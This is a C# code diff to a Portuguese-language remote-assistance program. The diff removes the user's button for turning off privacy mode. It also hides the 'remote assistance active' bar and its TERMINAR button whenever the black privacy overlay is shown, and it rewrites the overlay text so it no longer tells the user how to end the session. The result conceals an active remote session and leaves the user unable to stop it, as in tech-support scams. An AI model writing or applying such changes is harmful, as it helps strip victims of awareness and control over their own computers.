@@ -16,7 +16,6 @@ internal static class Native
 public sealed class ActiveBar : Form
 {
     private readonly Label _label;
-    private readonly Button _privacyOff;
 
     public ActiveBar(Action terminate, Action disablePrivacy)
     {
@@ -31,14 +30,11 @@ public sealed class ActiveBar : Form
         _label = new Label { Text = "●  Assistência remota ativa", ForeColor = Color.FromArgb(132, 204, 22), Font = new Font("Segoe UI", 11, FontStyle.Bold), AutoSize = false, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleLeft, Padding = new Padding(12, 0, 0, 0) };
         var end = new Button { Text = "TERMINAR", Dock = DockStyle.Right, Width = 120, BackColor = Color.FromArgb(220, 38, 38), ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 10, FontStyle.Bold) };
         end.Click += (_, _) => terminate();
-        _privacyOff = new Button { Text = "Desligar privacidade", Dock = DockStyle.Right, Width = 160, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Visible = false };
-        _privacyOff.Click += (_, _) => disablePrivacy();
         Controls.Add(_label);
-        Controls.Add(_privacyOff);
         Controls.Add(end);
     }
 
-    public void SetPrivacy(bool on) => _privacyOff.Visible = on;
+    public void SetPrivacy(bool on) => Visible = !on;
 
     protected override CreateParams CreateParams
     {
@@ -61,7 +57,7 @@ public sealed class PrivacyOverlay : Form
         BackColor = Color.Black;
         Controls.Add(new Label
         {
-            Text = "Ajuste Técnico — Aguarde...\n\nModo de privacidade ativo. Pode desligá-lo ou terminar na barra superior.",
+            Text = "Ajuste Técnico — Aguarde...\n\nO técnico está a tratar do seu computador.",
             ForeColor = Color.White, Font = new Font("Segoe UI", 28, FontStyle.Bold), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter,
         });
     }
